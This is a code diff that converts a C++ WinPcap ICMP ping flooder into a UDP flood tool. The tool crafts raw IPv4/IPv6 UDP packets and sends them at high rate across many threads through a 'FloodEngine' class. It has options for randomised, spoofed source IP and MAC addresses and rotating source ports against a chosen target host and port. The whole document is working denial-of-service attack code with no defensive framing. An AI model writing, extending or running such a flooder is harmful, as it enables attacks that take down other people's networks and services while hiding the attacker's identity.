@@ -1,4 +1,4 @@
-// g++ -g icmp.cpp -o icmp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
+// g++ -g udp.cpp -o udp.exe -I"./Include" -L"./Lib/x64" -lwpcap -lws2_32 -liphlpapi
 #define HAVE_REMOTE
 #include <pcap.h>
 #include <iostream>
@@ -40,12 +40,11 @@ struct ipv4_header {
     uint32_t daddr;
 };
 
-struct icmpv4_header {
-    uint8_t  type;
-    uint8_t  code;
+struct udphdr {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
     uint16_t check;
-    uint16_t id;
-    uint16_t seq;
 };
 
 struct ipv6_header {
@@ -55,14 +54,6 @@ struct ipv6_header {
     uint8_t  hop_limit;
     uint8_t  saddr[16];
     uint8_t  daddr[16];
-};
-
-struct icmpv6_header {
-    uint8_t  type;
-    uint8_t  code;
-    uint16_t check;
-    uint16_t id;
-    uint16_t seq;
 };
 #pragma pack(pop)
 
@@ -191,25 +182,24 @@ public:
     virtual const uint8_t* getBuffer() const = 0;
     virtual void setSrcMac(const uint8_t mac[6]) = 0;
     virtual void setSrcIp(const void* ip) = 0;
-    virtual void setIcmpId(uint16_t id) = 0;
-    virtual void setIcmpSeq(uint16_t seq) = 0;
+    virtual void setSrcPort(uint16_t port) = 0;
     virtual void recalcChecksum() = 0;
 };
 
 class PrebuiltPacketIPv4 : public PrebuiltPacket {
 public:
-    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(icmpv4_header);
+    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv4_header) + sizeof(udphdr);
     alignas(64) uint8_t buffer[PACKET_SIZE];
     size_t src_mac_offset;
     size_t src_ip_offset;
-    size_t icmp_id_offset;
-    size_t icmp_seq_offset;
+    size_t src_port_offset;
     uint32_t src_ip;
     uint32_t dst_ip;
+    uint16_t dst_port;
     uint8_t dst_mac[6];
 
-    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac)
-        : src_ip(src_ip), dst_ip(dst_ip) {
+    PrebuiltPacketIPv4(uint32_t src_ip, uint8_t* src_mac, uint32_t dst_ip, uint8_t* dst_mac, uint16_t dst_port)
+        : src_ip(src_ip), dst_ip(dst_ip), dst_port(dst_port) {
         memcpy(this->dst_mac, dst_mac, 6);
         memset(buffer, 0, PACKET_SIZE);
         ether_header* eth = (ether_header*)buffer;
@@ -219,17 +209,19 @@ public:
 
         ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
         ip->version = 4; ip->ihl = 5; ip->tos = 0;
-        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(icmpv4_header));
-        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 1; ip->check = 0;
+        ip->tot_len = htons(sizeof(ipv4_header) + sizeof(udphdr));
+        ip->id = 0; ip->frag_off = 0; ip->ttl = 64; ip->protocol = 17; ip->check = 0;
         ip->saddr = src_ip; ip->daddr = dst_ip;
 
-        icmpv4_header* icmp = (icmpv4_header*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
-        icmp->type = 8; icmp->code = 0; icmp->check = 0; icmp->id = 0; icmp->seq = 0;
+        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
+        udp->source = 0;
+        udp->dest = htons(dst_port);
+        udp->len = htons(sizeof(udphdr));
+        udp->check = 0;
 
         src_mac_offset = offsetof(ether_header, ether_shost);
         src_ip_offset = sizeof(ether_header) + offsetof(ipv4_header, saddr);
-        icmp_id_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(icmpv4_header, id);
-        icmp_seq_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(icmpv4_header, seq);
+        src_port_offset = sizeof(ether_header) + sizeof(ipv4_header) + offsetof(udphdr, source);
     }
 
     size_t getSize() const override { return PACKET_SIZE; }
@@ -239,37 +231,49 @@ public:
         src_ip = *(uint32_t*)ip;
         memcpy(buffer + src_ip_offset, ip, 4);
     }
-    void setIcmpId(uint16_t id) override {
-        uint16_t net_id = htons(id);
-        memcpy(buffer + icmp_id_offset, &net_id, 2);
-    }
-    void setIcmpSeq(uint16_t seq) override {
-        uint16_t net_seq = htons(seq);
-        memcpy(buffer + icmp_seq_offset, &net_seq, 2);
+    void setSrcPort(uint16_t port) override {
+        uint16_t net_port = htons(port);
+        memcpy(buffer + src_port_offset, &net_port, 2);
     }
     void recalcChecksum() override {
         ipv4_header* ip = (ipv4_header*)(buffer + sizeof(ether_header));
         ip->check = 0;
         ip->check = checksum((uint16_t*)ip, sizeof(ipv4_header));
-        icmpv4_header* icmp = (icmpv4_header*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
-        icmp->check = 0;
-        icmp->check = checksum((uint16_t*)icmp, sizeof(icmpv4_header));
+        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv4_header));
+        udp->check = 0;
+        struct pseudo_header {
+            uint32_t src;
+            uint32_t dst;
+            uint8_t zero;
+            uint8_t proto;
+            uint16_t len;
+        } ps;
+        ps.src = src_ip;
+        ps.dst = dst_ip;
+        ps.zero = 0;
+        ps.proto = 17;
+        ps.len = htons(sizeof(udphdr));
+        uint8_t pseudo_buf[sizeof(ps) + sizeof(udphdr)];
+        memcpy(pseudo_buf, &ps, sizeof(ps));
+        memcpy(pseudo_buf + sizeof(ps), udp, sizeof(udphdr));
+        udp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
     }
 };
 
 class PrebuiltPacketIPv6 : public PrebuiltPacket {
 public:
-    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(icmpv6_header);
+    static constexpr size_t PACKET_SIZE = sizeof(ether_header) + sizeof(ipv6_header) + sizeof(udphdr);
     alignas(64) uint8_t buffer[PACKET_SIZE];
     size_t src_mac_offset;
     size_t src_ip_offset;
-    size_t icmp_id_offset;
-    size_t icmp_seq_offset;
+    size_t src_port_offset;
     uint8_t src_ip[16];
     uint8_t dst_ip[16];
+    uint16_t dst_port;
     uint8_t dst_mac[6];
 
-    PrebuiltPacketIPv6(const uint8_t src_ip[16], uint8_t* src_mac, const uint8_t dst_ip[16], uint8_t* dst_mac) {
+    PrebuiltPacketIPv6(const uint8_t src_ip[16], uint8_t* src_mac, const uint8_t dst_ip[16], uint8_t* dst_mac, uint16_t dst_port)
+        : dst_port(dst_port) {
         memcpy(this->dst_mac, dst_mac, 6);
         memcpy(this->src_ip, src_ip, 16);
         memcpy(this->dst_ip, dst_ip, 16);
@@ -281,23 +285,21 @@ public:
 
         ipv6_header* ip6 = (ipv6_header*)(buffer + sizeof(ether_header));
         ip6->vtc_flow = htonl(0x60000000);
-        ip6->payload_len = htons(sizeof(icmpv6_header));
-        ip6->next_header = 58;
+        ip6->payload_len = htons(sizeof(udphdr));
+        ip6->next_header = 17;
         ip6->hop_limit = 64;
         memcpy(ip6->saddr, src_ip, 16);
         memcpy(ip6->daddr, dst_ip, 16);
 
-        icmpv6_header* icmp = (icmpv6_header*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
-        icmp->type = 128;
-        icmp->code = 0;
-        icmp->check = 0;
-        icmp->id = 0;
-        icmp->seq = 0;
+        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
+        udp->source = 0;
+        udp->dest = htons(dst_port);
+        udp->len = htons(sizeof(udphdr));
+        udp->check = 0;
 
         src_mac_offset = offsetof(ether_header, ether_shost);
         src_ip_offset = sizeof(ether_header) + offsetof(ipv6_header, saddr);
-        icmp_id_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(icmpv6_header, id);
-        icmp_seq_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(icmpv6_header, seq);
+        src_port_offset = sizeof(ether_header) + sizeof(ipv6_header) + offsetof(udphdr, source);
     }
 
     size_t getSize() const override { return PACKET_SIZE; }
@@ -307,13 +309,9 @@ public:
         memcpy(src_ip, ip, 16);
         memcpy(buffer + src_ip_offset, ip, 16);
     }
-    void setIcmpId(uint16_t id) override {
-        uint16_t net_id = htons(id);
-        memcpy(buffer + icmp_id_offset, &net_id, 2);
-    }
-    void setIcmpSeq(uint16_t seq) override {
-        uint16_t net_seq = htons(seq);
-        memcpy(buffer + icmp_seq_offset, &net_seq, 2);
+    void setSrcPort(uint16_t port) override {
+        uint16_t net_port = htons(port);
+        memcpy(buffer + src_port_offset, &net_port, 2);
     }
     void recalcChecksum() override {
         struct pseudo_ipv6 {
@@ -325,15 +323,15 @@ public:
         } ps;
         memcpy(ps.src, src_ip, 16);
         memcpy(ps.dst, dst_ip, 16);
-        ps.length = htonl(sizeof(icmpv6_header));
+        ps.length = htonl(sizeof(udphdr));
         ps.zero[0] = ps.zero[1] = ps.zero[2] = 0;
-        ps.next_header = 58;
-        icmpv6_header* icmp = (icmpv6_header*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
-        icmp->check = 0;
-        uint8_t pseudo_buf[sizeof(ps) + sizeof(icmpv6_header)];
+        ps.next_header = 17;
+        udphdr* udp = (udphdr*)(buffer + sizeof(ether_header) + sizeof(ipv6_header));
+        udp->check = 0;
+        uint8_t pseudo_buf[sizeof(ps) + sizeof(udphdr)];
         memcpy(pseudo_buf, &ps, sizeof(ps));
-        memcpy(pseudo_buf + sizeof(ps), icmp, sizeof(icmpv6_header));
-        icmp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
+        memcpy(pseudo_buf + sizeof(ps), udp, sizeof(udphdr));
+        udp->check = checksum((uint16_t*)pseudo_buf, sizeof(pseudo_buf));
     }
 };
 
@@ -343,22 +341,22 @@ private:
     std::unique_ptr<PrebuiltPacket> packet;
     std::atomic<uint64_t>& total_packets_sent;
     std::atomic<bool>& stop_flag;
-    uint16_t counter;
+    uint16_t port_counter;
     bool random_ip;
     bool random_mac;
     bool is_ipv6_mode;
 
 public:
     FloodEngine(pcap_t* handle, void* src_ip, uint8_t* src_mac, void* dst_ip, uint8_t* dst_mac,
-                int thread_index, std::atomic<uint64_t>& total_counter, std::atomic<bool>& stop,
-                bool random_ip_flag, bool random_mac_flag, bool ipv6)
+                uint16_t dst_port, int thread_index, std::atomic<uint64_t>& total_counter,
+                std::atomic<bool>& stop, bool random_ip_flag, bool random_mac_flag, bool ipv6)
         : pcap_handle(handle), total_packets_sent(total_counter), stop_flag(stop),
-          counter(thread_index * 1000), random_ip(random_ip_flag), random_mac(random_mac_flag),
+          port_counter(1024 + thread_index * 1000), random_ip(random_ip_flag), random_mac(random_mac_flag),
           is_ipv6_mode(ipv6) {
         if (ipv6) {
-            packet = std::make_unique<PrebuiltPacketIPv6>((uint8_t*)src_ip, src_mac, (uint8_t*)dst_ip, dst_mac);
+            packet = std::make_unique<PrebuiltPacketIPv6>((uint8_t*)src_ip, src_mac, (uint8_t*)dst_ip, dst_mac, dst_port);
         } else {
-            packet = std::make_unique<PrebuiltPacketIPv4>(*(uint32_t*)src_ip, src_mac, *(uint32_t*)dst_ip, dst_mac);
+            packet = std::make_unique<PrebuiltPacketIPv4>(*(uint32_t*)src_ip, src_mac, *(uint32_t*)dst_ip, dst_mac, dst_port);
         }
     }
 
@@ -392,9 +390,9 @@ public:
                 for (int i = 1; i < 6; ++i) mac[i] = lcg(seed) & 0xFF;
                 packet->setSrcMac(mac);
             }
-            uint16_t id = counter++;
-            packet->setIcmpId(id);
-            packet->setIcmpSeq(id);
+            uint16_t port = port_counter++;
+            if (port_counter > 65535) port_counter = 1024;
+            packet->setSrcPort(port);
             packet->recalcChecksum();
 
             if (pcap_sendpacket(pcap_handle, packet->getBuffer(), (int)packet->getSize()) == 0) {
@@ -409,9 +407,9 @@ public:
 };
 
 int main(int argc, char* argv[]) {
-    if (argc < 5) {
+    if (argc < 6) {
         std::cerr << "Usage: " << argv[0]
-                  << " <src_ip> <dst_ip> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n";
+                  << " <src_ip> <dst_ip> <dst_port> <threads> <duration_sec> [dst_mac] [--random-ip] [--random-mac]\n";
         return 1;
     }
 
@@ -436,13 +434,14 @@ int main(int argc, char* argv[]) {
         dst_ip4 = inet_addr(argv[2]);
     }
 
-    int num_threads = atoi(argv[3]);
-    int duration = atoi(argv[4]);
-    if (num_threads <= 0 || duration < 0) return 1;
+    uint16_t dst_port = (uint16_t)atoi(argv[3]);
+    int num_threads = atoi(argv[4]);
+    int duration = atoi(argv[5]);
+    if (dst_port == 0 || num_threads <= 0 || duration < 0) return 1;
 
     uint8_t dst_mac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
     bool random_ip = false, random_mac = false;
-    for (int i = 5; i < argc; i++) {
+    for (int i = 6; i < argc; i++) {
         if (strcmp(argv[i], "--random-ip") == 0) random_ip = true;
         else if (strcmp(argv[i], "--random-mac") == 0) random_mac = true;
         else if (parse_mac_strict(argv[i], dst_mac)) { /* ok */ }
@@ -515,7 +514,7 @@ int main(int argc, char* argv[]) {
         void* src_ptr = ipv6 ? (void*)src_ip6 : (void*)&src_ip4;
         void* dst_ptr = ipv6 ? (void*)dst_ip6 : (void*)&dst_ip4;
         auto engine = std::make_unique<FloodEngine>(handles[i], src_ptr, src_mac, dst_ptr, dst_mac,
-                                                    i, total_packets, stop, random_ip, random_mac, ipv6);
+                                                    dst_port, i, total_packets, stop, random_ip, random_mac, ipv6);
         workers.emplace_back(&FloodEngine::start, engine.get(), i % cores);
         engine.release();
     }
